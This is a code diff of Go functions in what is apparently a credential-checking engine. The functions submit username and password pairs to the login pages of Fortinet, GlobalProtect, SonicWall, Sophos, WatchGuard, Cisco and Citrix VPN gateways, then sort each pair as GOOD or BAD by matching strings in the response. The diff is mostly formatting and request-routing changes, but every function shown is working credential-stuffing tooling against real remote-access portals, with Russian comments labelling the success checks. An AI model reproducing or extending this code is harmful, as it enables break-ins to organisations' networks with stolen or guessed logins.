@@ -31,7 +31,7 @@ func (e *Engine) checkFortinetUltraFast(ctx context.Context, cred Credential, re
 	if !strings.HasPrefix(targetURL, "http") {
 		targetURL = "https://" + targetURL
 	}
-	
+
 	// Add /remote/login endpoint
 	if !strings.Contains(targetURL, "/remote/login") {
 		if strings.HasSuffix(targetURL, "/") {
@@ -40,13 +40,13 @@ func (e *Engine) checkFortinetUltraFast(ctx context.Context, cred Credential, re
 			targetURL += "/remote/login"
 		}
 	}
-	
+
 	// Pre-build form data as bytes to avoid string allocations
-	formData := fmt.Sprintf("username=%s&password=%s", 
-		url.QueryEscape(cred.Username), 
+	formData := fmt.Sprintf("username=%s&password=%s",
+		url.QueryEscape(cred.Username),
 		url.QueryEscape(cred.Password))
-	
-	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, 
+
+	req, err := http.NewRequestWithContext(ctx, "POST", targetURL,
 		bytes.NewReader(stringToBytes(formData)))
 	if err != nil {
 		return false, err
@@ -60,7 +60,7 @@ func (e *Engine) checkFortinetUltraFast(ctx context.Context, cred Credential, re
 	req.Header.Set("Connection", "close")
 	req.Close = true
 
-	httpResp, err := e.client.Do(req)
+	httpResp, err := e.doRequest(req)
 	if err != nil {
 		return false, err
 	}
@@ -71,13 +71,13 @@ func (e *Engine) checkFortinetUltraFast(ctx context.Context, cred Credential, re
 	if err != nil && err != io.ErrUnexpectedEOF && err != io.EOF {
 		return false, err
 	}
-	
+
 	bodyStr := bytesToString(buf[:n])
-	
+
 	// Store response data
 	resp.StatusCode = httpResp.StatusCode
 	resp.Body = append(resp.Body[:0], buf[:n]...)
-	
+
 	// ✅ ТОЧНАЯ ЛОГИКА ДЛЯ FORTINET (ОСНОВАНА НА РЕАЛЬНЫХ ДАННЫХ)
 	if httpResp.StatusCode == 200 {
 		// GOOD: Основные индикаторы успешной аутентификации
@@ -85,26 +85,26 @@ func (e *Engine) checkFortinetUltraFast(ctx context.Context, cred Credential, re
 			"vpn/tunnel",           // ✅ Главный индикатор успеха
 			"/remote/fortisslvpn",  // ✅ SSL VPN портал
 			"tunnel_mode",          // ✅ Режим туннеля
-			"sslvpn_login",        // ✅ SSL VPN логин
+			"sslvpn_login",         // ✅ SSL VPN логин
 			"forticlient_download", // ✅ Загрузка клиента
 			"portal.html",          // ✅ Портал
 			"welcome.html",         // ✅ Страница приветствия
-			"fgt_lang",            // ✅ Языковые настройки FortiGate
-			"FortiGate",           // ✅ Название продукта
-			"sslvpn_portal",       // ✅ SSL VPN портал
-			"logout",              // ✅ Кнопка выхода (признак успешного входа)
-			"dashboard",           // ✅ Панель управления
-			"web_access",          // ✅ Веб доступ
-			"tunnel_access",       // ✅ Туннельный доступ
+			"fgt_lang",             // ✅ Языковые настройки FortiGate
+			"FortiGate",            // ✅ Название продукта
+			"sslvpn_portal",        // ✅ SSL VPN портал
+			"logout",               // ✅ Кнопка выхода (признак успешного входа)
+			"dashboard",            // ✅ Панель управления
+			"web_access",           // ✅ Веб доступ
+			"tunnel_access",        // ✅ Туннельный доступ
 		}
-		
+
 		// Проверяем наличие любого из индикаторов успеха
 		for _, indicator := range successIndicators {
 			if strings.Contains(bodyStr, indicator) {
 				return true, nil
 			}
 		}
-		
+
 		// BAD: Индикаторы неудачной аутентификации
 		failureIndicators := []string{
 			"invalid",
@@ -117,22 +117,22 @@ func (e *Engine) checkFortinetUltraFast(ctx context.Context, cred Credential, re
 			"login failed",
 			"access denied",
 		}
-		
+
 		// Если есть индикаторы неудачи - точно BAD
 		for _, indicator := range failureIndicators {
 			if strings.Contains(strings.ToLower(bodyStr), indicator) {
 				return false, nil
 			}
 		}
-		
+
 		// Если есть форма логина без ошибок - может быть успех
-		if strings.Contains(bodyStr, "form") && 
-		   strings.Contains(bodyStr, "fortinet") &&
-		   len(bodyStr) > 1000 { // Достаточно большой ответ
+		if strings.Contains(bodyStr, "form") &&
+			strings.Contains(bodyStr, "fortinet") &&
+			len(bodyStr) > 1000 { // Достаточно большой ответ
 			return true, nil
 		}
 	}
-	
+
 	// Check for redirect to portal (also valid)
 	if httpResp.StatusCode == 302 || httpResp.StatusCode == 301 {
 		location := httpResp.Header.Get("Location")
@@ -142,7 +142,7 @@ func (e *Engine) checkFortinetUltraFast(ctx context.Context, cred Credential, re
 			strings.Contains(location, "welcome") ||
 			strings.Contains(location, "dashboard"), nil
 	}
-	
+
 	return false, nil
 }
 
@@ -153,7 +153,7 @@ func (e *Engine) checkGlobalProtectUltraFast(ctx context.Context, cred Credentia
 	if !strings.HasPrefix(targetURL, "http") {
 		targetURL = "https://" + targetURL
 	}
-	
+
 	// Add GlobalProtect endpoint
 	if !strings.Contains(targetURL, "/global-protect/login.esp") {
 		if strings.HasSuffix(targetURL, "/") {
@@ -162,13 +162,13 @@ func (e *Engine) checkGlobalProtectUltraFast(ctx context.Context, cred Credentia
 			targetURL += "/global-protect/login.esp"
 		}
 	}
-	
+
 	formData := fmt.Sprintf("prot=https%%&server=%s&inputStr=&action=getsoftware&user=%s&passwd=%s&ok=Log+In",
 		url.QueryEscape(cred.IP),
-		url.QueryEscape(cred.Username), 
+		url.QueryEscape(cred.Username),
 		url.QueryEscape(cred.Password))
 
-	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, 
+	req, err := http.NewRequestWithContext(ctx, "POST", targetURL,
 		bytes.NewReader(stringToBytes(formData)))
 	if err != nil {
 		return false, err
@@ -179,7 +179,7 @@ func (e *Engine) checkGlobalProtectUltraFast(ctx context.Context, cred Credentia
 	req.Header.Set("Connection", "close")
 	req.Close = true
 
-	httpResp, err := e.client.Do(req)
+	httpResp, err := e.doRequest(req)
 	if err != nil {
 		return false, err
 	}
@@ -189,7 +189,7 @@ func (e *Engine) checkGlobalProtectUltraFast(ctx context.Context, cred Credentia
 	if err != nil && err != io.ErrUnexpectedEOF && err != io.EOF {
 		return false, err
 	}
-	
+
 	bodyStr := bytesToString(buf[:n])
 	resp.StatusCode = httpResp.StatusCode
 	resp.Body = append(resp.Body[:0], buf[:n]...)
@@ -199,11 +199,11 @@ func (e *Engine) checkGlobalProtectUltraFast(ctx context.Context, cred Credentia
 		// GOOD: Основные индикаторы успеха для GlobalProtect
 		successIndicators := []string{
 			"Download Windows 64 bit GlobalProtect agent", // ✅ Главный индикатор
-			"globalprotect/portal/css",                     // ✅ CSS портала
-			"portal-userauthcookie",                        // ✅ Куки аутентификации
-			"GlobalProtect Portal",                         // ✅ Название портала
-			"gp-portal",                                    // ✅ GP портал
-			"/global-protect/portal",                       // ✅ Путь к порталу
+			"globalprotect/portal/css",                    // ✅ CSS портала
+			"portal-userauthcookie",                       // ✅ Куки аутентификации
+			"GlobalProtect Portal",                        // ✅ Название портала
+			"gp-portal",                                   // ✅ GP портал
+			"/global-protect/portal",                      // ✅ Путь к порталу
 			"PanGlobalProtect",                            // ✅ Название продукта
 			"clientDownload",                              // ✅ Загрузка клиента
 			"hip-report",                                  // ✅ HIP отчет
@@ -212,21 +212,21 @@ func (e *Engine) checkGlobalProtectUltraFast(ctx context.Context, cred Credentia
 			"logout",                                      // ✅ Кнопка выхода
 			"welcome",                                     // ✅ Приветствие
 		}
-		
+
 		for _, indicator := range successIndicators {
 			if strings.Contains(bodyStr, indicator) {
 				return true, nil
 			}
 		}
-		
+
 		// BAD: Индикаторы неудачи
 		if strings.Contains(strings.ToLower(bodyStr), "invalid") ||
-		   strings.Contains(strings.ToLower(bodyStr), "failed") ||
-		   strings.Contains(strings.ToLower(bodyStr), "error") {
+			strings.Contains(strings.ToLower(bodyStr), "failed") ||
+			strings.Contains(strings.ToLower(bodyStr), "error") {
 			return false, nil
 		}
 	}
-	
+
 	return false, nil
 }
 
@@ -236,17 +236,17 @@ func (e *Engine) checkSonicWallUltraFast(ctx context.Context, cred Credential, r
 	parts := strings.Split(cred.Password, ";")
 	password := cred.Password
 	domain := ""
-	
+
 	if len(parts) == 2 {
 		password = parts[0]
 		domain = parts[1]
 	}
-	
+
 	targetURL := cred.IP
 	if !strings.HasPrefix(targetURL, "http") {
 		targetURL = "https://" + targetURL
 	}
-	
+
 	// SonicWall login endpoint
 	if !strings.Contains(targetURL, "/auth.html") {
 		if strings.HasSuffix(targetURL, "/") {
@@ -255,13 +255,13 @@ func (e *Engine) checkSonicWallUltraFast(ctx context.Context, cred Credential, r
 			targetURL += "/auth.html"
 		}
 	}
-	
+
 	formData := fmt.Sprintf("username=%s&password=%s&domain=%s&login=Login",
-		url.QueryEscape(cred.Username), 
+		url.QueryEscape(cred.Username),
 		url.QueryEscape(password),
 		url.QueryEscape(domain))
 
-	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, 
+	req, err := http.NewRequestWithContext(ctx, "POST", targetURL,
 		bytes.NewReader(stringToBytes(formData)))
 	if err != nil {
 		return false, err
@@ -272,7 +272,7 @@ func (e *Engine) checkSonicWallUltraFast(ctx context.Context, cred Credential, r
 	req.Header.Set("Connection", "close")
 	req.Close = true
 
-	httpResp, err := e.client.Do(req)
+	httpResp, err := e.doRequest(req)
 	if err != nil {
 		return false, err
 	}
@@ -282,7 +282,7 @@ func (e *Engine) checkSonicWallUltraFast(ctx context.Context, cred Credential, r
 	if err != nil && err != io.ErrUnexpectedEOF && err != io.EOF {
 		return false, err
 	}
-	
+
 	bodyStr := bytesToString(buf[:n])
 	resp.StatusCode = httpResp.StatusCode
 	resp.Body = append(resp.Body[:0], buf[:n]...)
@@ -291,32 +291,32 @@ func (e *Engine) checkSonicWallUltraFast(ctx context.Context, cred Credential, r
 	if httpResp.StatusCode == 200 {
 		// GOOD: Индикаторы успеха для SonicWall
 		successIndicators := []string{
-			"SonicWall",      // ✅ Название продукта
-			"NetExtender",    // ✅ VPN клиент
-			"sslvpn",        // ✅ SSL VPN
-			"portal.html",   // ✅ Портал
-			"welcome",       // ✅ Приветствие
-			"logout",        // ✅ Выход
-			"dashboard",     // ✅ Панель
-			"tunnel",        // ✅ Туннель
-			"vpn-client",    // ✅ VPN клиент
+			"SonicWall",   // ✅ Название продукта
+			"NetExtender", // ✅ VPN клиент
+			"sslvpn",      // ✅ SSL VPN
+			"portal.html", // ✅ Портал
+			"welcome",     // ✅ Приветствие
+			"logout",      // ✅ Выход
+			"dashboard",   // ✅ Панель
+			"tunnel",      // ✅ Туннель
+			"vpn-client",  // ✅ VPN клиент
 		}
-		
+
 		for _, indicator := range successIndicators {
 			if strings.Contains(bodyStr, indicator) {
 				return true, nil
 			}
 		}
-		
+
 		// Проверяем отсутствие ошибок при наличии SonicWall контента
-		if strings.Contains(strings.ToLower(bodyStr), "sonic") && 
-		   !strings.Contains(strings.ToLower(bodyStr), "error") &&
-		   !strings.Contains(strings.ToLower(bodyStr), "invalid") &&
-		   !strings.Contains(strings.ToLower(bodyStr), "failed") {
+		if strings.Contains(strings.ToLower(bodyStr), "sonic") &&
+			!strings.Contains(strings.ToLower(bodyStr), "error") &&
+			!strings.Contains(strings.ToLower(bodyStr), "invalid") &&
+			!strings.Contains(strings.ToLower(bodyStr), "failed") {
 			return true, nil
 		}
 	}
-	
+
 	return false, nil
 }
 
@@ -326,17 +326,17 @@ func (e *Engine) checkSophosUltraFast(ctx context.Context, cred Credential, resp
 	parts := strings.Split(cred.Password, ";")
 	password := cred.Password
 	domain := ""
-	
+
 	if len(parts) == 2 {
 		password = parts[0]
 		domain = parts[1]
 	}
-	
+
 	targetURL := cred.IP
 	if !strings.HasPrefix(targetURL, "http") {
 		targetURL = "https://" + targetURL
 	}
-	
+
 	// Sophos login endpoint
 	if !strings.Contains(targetURL, "/userportal/webpages/myaccount/login.jsp") {
 		if strings.HasSuffix(targetURL, "/") {
@@ -345,13 +345,13 @@ func (e *Engine) checkSophosUltraFast(ctx context.Context, cred Credential, resp
 			targetURL += "/userportal/webpages/myaccount/login.jsp"
 		}
 	}
-	
+
 	formData := fmt.Sprintf("username=%s&password=%s&domain=%s&loginBtn=Login",
-		url.QueryEscape(cred.Username), 
+		url.QueryEscape(cred.Username),
 		url.QueryEscape(password),
 		url.QueryEscape(domain))
 
-	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, 
+	req, err := http.NewRequestWithContext(ctx, "POST", targetURL,
 		bytes.NewReader(stringToBytes(formData)))
 	if err != nil {
 		return false, err
@@ -362,7 +362,7 @@ func (e *Engine) checkSophosUltraFast(ctx context.Context, cred Credential, resp
 	req.Header.Set("Connection", "close")
 	req.Close = true
 
-	httpResp, err := e.client.Do(req)
+	httpResp, err := e.doRequest(req)
 	if err != nil {
 		return false, err
 	}
@@ -372,7 +372,7 @@ func (e *Engine) checkSophosUltraFast(ctx context.Context, cred Credential, resp
 	if err != nil && err != io.ErrUnexpectedEOF && err != io.EOF {
 		return false, err
 	}
-	
+
 	bodyStr := bytesToString(buf[:n])
 	resp.StatusCode = httpResp.StatusCode
 	resp.Body = append(resp.Body[:0], buf[:n]...)
@@ -380,24 +380,24 @@ func (e *Engine) checkSophosUltraFast(ctx context.Context, cred Credential, resp
 	// ✅ ТОЧНАЯ ЛОГИКА ДЛЯ SOPHOS
 	if httpResp.StatusCode == 200 {
 		successIndicators := []string{
-			"Sophos",        // ✅ Название продукта
-			"userportal",    // ✅ Пользовательский портал
-			"myaccount",     // ✅ Мой аккаунт
-			"welcome",       // ✅ Приветствие
-			"logout",        // ✅ Выход
-			"portal",        // ✅ Портал
-			"dashboard",     // ✅ Панель
-			"vpn-client",    // ✅ VPN клиент
-			"tunnel",        // ✅ Туннель
+			"Sophos",     // ✅ Название продукта
+			"userportal", // ✅ Пользовательский портал
+			"myaccount",  // ✅ Мой аккаунт
+			"welcome",    // ✅ Приветствие
+			"logout",     // ✅ Выход
+			"portal",     // ✅ Портал
+			"dashboard",  // ✅ Панель
+			"vpn-client", // ✅ VPN клиент
+			"tunnel",     // ✅ Туннель
 		}
-		
+
 		for _, indicator := range successIndicators {
 			if strings.Contains(bodyStr, indicator) {
 				return true, nil
 			}
 		}
 	}
-	
+
 	return false, nil
 }
 
@@ -408,18 +408,18 @@ func (e *Engine) checkWatchGuardUltraFast(ctx context.Context, cred Credential, 
 	if len(parts) < 6 {
 		return false, fmt.Errorf("invalid WatchGuard format")
 	}
-	
+
 	ip := parts[0] + ":" + parts[1] // https://ip:port
 	authType := parts[2]            // Firebox-DB or AuthPoint
 	domain := parts[3]              // domain
 	username := parts[4]            // username
 	password := parts[5]            // password
-	
+
 	targetURL := ip
 	if !strings.HasPrefix(targetURL, "http") {
 		targetURL = "https://" + targetURL
 	}
-	
+
 	// WatchGuard login endpoint
 	if !strings.Contains(targetURL, "/auth.fcc") {
 		if strings.HasSuffix(targetURL, "/") {
@@ -428,14 +428,14 @@ func (e *Engine) checkWatchGuardUltraFast(ctx context.Context, cred Credential, 
 			targetURL += "/auth.fcc"
 		}
 	}
-	
+
 	formData := fmt.Sprintf("domain=%s&username=%s&password=%s&authType=%s&login=Login",
 		url.QueryEscape(domain),
-		url.QueryEscape(username), 
+		url.QueryEscape(username),
 		url.QueryEscape(password),
 		url.QueryEscape(authType))
 
-	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, 
+	req, err := http.NewRequestWithContext(ctx, "POST", targetURL,
 		bytes.NewReader(stringToBytes(formData)))
 	if err != nil {
 		return false, err
@@ -446,7 +446,7 @@ func (e *Engine) checkWatchGuardUltraFast(ctx context.Context, cred Credential, 
 	req.Header.Set("Connection", "close")
 	req.Close = true
 
-	httpResp, err := e.client.Do(req)
+	httpResp, err := e.doRequest(req)
 	if err != nil {
 		return false, err
 	}
@@ -456,7 +456,7 @@ func (e *Engine) checkWatchGuardUltraFast(ctx context.Context, cred Credential, 
 	if err != nil && err != io.ErrUnexpectedEOF && err != io.EOF {
 		return false, err
 	}
-	
+
 	bodyStr := bytesToString(buf[:n])
 	resp.StatusCode = httpResp.StatusCode
 	resp.Body = append(resp.Body[:0], buf[:n]...)
@@ -464,24 +464,24 @@ func (e *Engine) checkWatchGuardUltraFast(ctx context.Context, cred Credential, 
 	// ✅ ТОЧНАЯ ЛОГИКА ДЛЯ WATCHGUARD
 	if httpResp.StatusCode == 200 {
 		successIndicators := []string{
-			"WatchGuard",    // ✅ Название продукта
-			"Firebox",       // ✅ Firebox
-			"portal",        // ✅ Портал
-			"welcome",       // ✅ Приветствие
-			"logout",        // ✅ Выход
-			"AuthPoint",     // ✅ AuthPoint
-			"dashboard",     // ✅ Панель
-			"tunnel",        // ✅ Туннель
-			"vpn-client",    // ✅ VPN клиент
+			"WatchGuard", // ✅ Название продукта
+			"Firebox",    // ✅ Firebox
+			"portal",     // ✅ Портал
+			"welcome",    // ✅ Приветствие
+			"logout",     // ✅ Выход
+			"AuthPoint",  // ✅ AuthPoint
+			"dashboard",  // ✅ Панель
+			"tunnel",     // ✅ Туннель
+			"vpn-client", // ✅ VPN клиент
 		}
-		
+
 		for _, indicator := range successIndicators {
 			if strings.Contains(bodyStr, indicator) {
 				return true, nil
 			}
 		}
 	}
-	
+
 	return false, nil
 }
 
@@ -492,7 +492,7 @@ func (e *Engine) checkCiscoUltraFast(ctx context.Context, cred Credential, resp 
 	if len(parts) < 4 {
 		return false, fmt.Errorf("invalid Cisco format")
 	}
-	
+
 	ip := parts[0] + ":" + parts[1] // https://ip:port
 	username := parts[2]            // username
 	password := parts[3]            // password
@@ -500,12 +500,12 @@ func (e *Engine) checkCiscoUltraFast(ctx context.Context, cred Credential, resp 
 	if len(parts) > 4 {
 		group = parts[4] // group (optional)
 	}
-	
+
 	targetURL := ip
 	if !strings.HasPrefix(targetURL, "http") {
 		targetURL = "https://" + targetURL
 	}
-	
+
 	// Cisco ASA login endpoint
 	if !strings.Contains(targetURL, "/+webvpn+/index.html") {
 		if strings.HasSuffix(targetURL, "/") {
@@ -514,13 +514,13 @@ func (e *Engine) checkCiscoUltraFast(ctx context.Context, cred Credential, resp 
 			targetURL += "/+webvpn+/index.html"
 		}
 	}
-	
+
 	formData := fmt.Sprintf("username=%s&password=%s&group_list=%s&Login=Logon",
-		url.QueryEscape(username), 
+		url.QueryEscape(username),
 		url.QueryEscape(password),
 		url.QueryEscape(group))
 
-	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, 
+	req, err := http.NewRequestWithContext(ctx, "POST", targetURL,
 		bytes.NewReader(stringToBytes(formData)))
 	if err != nil {
 		return false, err
@@ -531,7 +531,7 @@ func (e *Engine) checkCiscoUltraFast(ctx context.Context, cred Credential, resp 
 	req.Header.Set("Connection", "close")
 	req.Close = true
 
-	httpResp, err := e.client.Do(req)
+	httpResp, err := e.doRequest(req)
 	if err != nil {
 		return false, err
 	}
@@ -541,7 +541,7 @@ func (e *Engine) checkCiscoUltraFast(ctx context.Context, cred Credential, resp 
 	if err != nil && err != io.ErrUnexpectedEOF && err != io.EOF {
 		return false, err
 	}
-	
+
 	bodyStr := bytesToString(buf[:n])
 	resp.StatusCode = httpResp.StatusCode
 	resp.Body = append(resp.Body[:0], buf[:n]...)
@@ -552,45 +552,45 @@ func (e *Engine) checkCiscoUltraFast(ctx context.Context, cred Credential, resp 
 		if strings.Contains(bodyStr, "SSL VPN Service") && strings.Contains(bodyStr, "webvpn_logout") {
 			return true, nil
 		}
-		
+
 		// Дополнительные индикаторы успеха
 		successIndicators := []string{
-			"/+CSCOE+/",                    // ✅ Cisco CSCOE
-			"webvpn_portal",               // ✅ WebVPN портал
-			"Cisco Systems VPN Client",    // ✅ VPN клиент
-			"/+webvpn+/",                 // ✅ WebVPN путь
-			"anyconnect",                 // ✅ AnyConnect (lowercase)
-			"ANYCONNECT",                 // ✅ AnyConnect (uppercase)
-			"remote_access",              // ✅ Удаленный доступ
+			"/+CSCOE+/",                // ✅ Cisco CSCOE
+			"webvpn_portal",            // ✅ WebVPN портал
+			"Cisco Systems VPN Client", // ✅ VPN клиент
+			"/+webvpn+/",               // ✅ WebVPN путь
+			"anyconnect",               // ✅ AnyConnect (lowercase)
+			"ANYCONNECT",               // ✅ AnyConnect (uppercase)
+			"remote_access",            // ✅ Удаленный доступ
 		}
-		
+
 		for _, indicator := range successIndicators {
 			if strings.Contains(bodyStr, indicator) {
 				return true, nil
 			}
 		}
-		
+
 		// Проверяем наличие портала или welcome без ошибок
 		if (strings.Contains(bodyStr, "portal") || strings.Contains(bodyStr, "welcome")) &&
-		   !strings.Contains(strings.ToLower(bodyStr), "error") &&
-		   !strings.Contains(strings.ToLower(bodyStr), "invalid") &&
-		   !strings.Contains(strings.ToLower(bodyStr), "failed") {
+			!strings.Contains(strings.ToLower(bodyStr), "error") &&
+			!strings.Contains(strings.ToLower(bodyStr), "invalid") &&
+			!strings.Contains(strings.ToLower(bodyStr), "failed") {
 			return true, nil
 		}
 	}
-	
+
 	return false, nil
 }
 
 // ✅ ИСПРАВЛЕННАЯ ЛОГИКА ДЛЯ CITRIX
 func (e *Engine) checkCitrixUltraFast(ctx context.Context, cred Credential, resp *Response, buf []byte) (bool, error) {
 	targetURL := fmt.Sprintf("https://%s/p/u/doAuthentication.do", cred.IP)
-	
+
 	formData := fmt.Sprintf("login=%s&passwd=%s&savecredentials=false&nsg-x1-logon-button=Log+On&StateContext=bG9naW5zY2hlbWE9ZGVmYXVsdA%%3D%%3D",
-		url.QueryEscape(cred.Username), 
+		url.QueryEscape(cred.Username),
 		url.QueryEscape(cred.Password))
 
-	req, err := http.NewRequestWithContext(ctx, "POST", targetURL, 
+	req, err := http.NewRequestWithContext(ctx, "POST", targetURL,
 		bytes.NewReader(stringToBytes(formData)))
 	if err != nil {
 		return false, err
@@ -601,7 +601,7 @@ func (e *Engine) checkCitrixUltraFast(ctx context.Context, cred Credential, resp
 	req.Header.Set("Connection", "close")
 	req.Close = true
 
-	httpResp, err := e.client.Do(req)
+	httpResp, err := e.doRequest(req)
 	if err != nil {
 		return false, err
 	}
@@ -611,7 +611,7 @@ func (e *Engine) checkCitrixUltraFast(ctx context.Context, cred Credential, resp
 	if err != nil && err != io.ErrUnexpectedEOF && err != io.EOF {
 		return false, err
 	}
-	
+
 	bodyStr := bytesToString(buf[:n])
 	resp.StatusCode = httpResp.StatusCode
 	resp.Body = append(resp.Body[:0], buf[:n]...)
@@ -622,26 +622,26 @@ func (e *Engine) checkCitrixUltraFast(ctx context.Context, cred Credential, resp
 		if strings.Contains(bodyStr, "<CredentialUpdateService>/p/a/getCredentialUpdateRequirements.do</CredentialUpdateService>") {
 			return true, nil
 		}
-		
+
 		successIndicators := []string{
-			"NetScaler Gateway",    // ✅ NetScaler Gateway
-			"/vpn/index.html",     // ✅ VPN индекс
-			"citrix-logon",        // ✅ Citrix логин
-			"/logon/LogonPoint/",  // ✅ Точка входа
-			"NSGateway",           // ✅ NS Gateway
-			"portal",              // ✅ Портал
-			"welcome",             // ✅ Приветствие
-			"logout",              // ✅ Выход
-			"dashboard",           // ✅ Панель
+			"NetScaler Gateway",  // ✅ NetScaler Gateway
+			"/vpn/index.html",    // ✅ VPN индекс
+			"citrix-logon",       // ✅ Citrix логин
+			"/logon/LogonPoint/", // ✅ Точка входа
+			"NSGateway",          // ✅ NS Gateway
+			"portal",             // ✅ Портал
+			"welcome",            // ✅ Приветствие
+			"logout",             // ✅ Выход
+			"dashboard",          // ✅ Панель
 		}
-		
+
 		for _, indicator := range successIndicators {
 			if strings.Contains(bodyStr, indicator) {
 				return true, nil
 			}
 		}
 	}
-	
+
 	return false, nil
 }
 
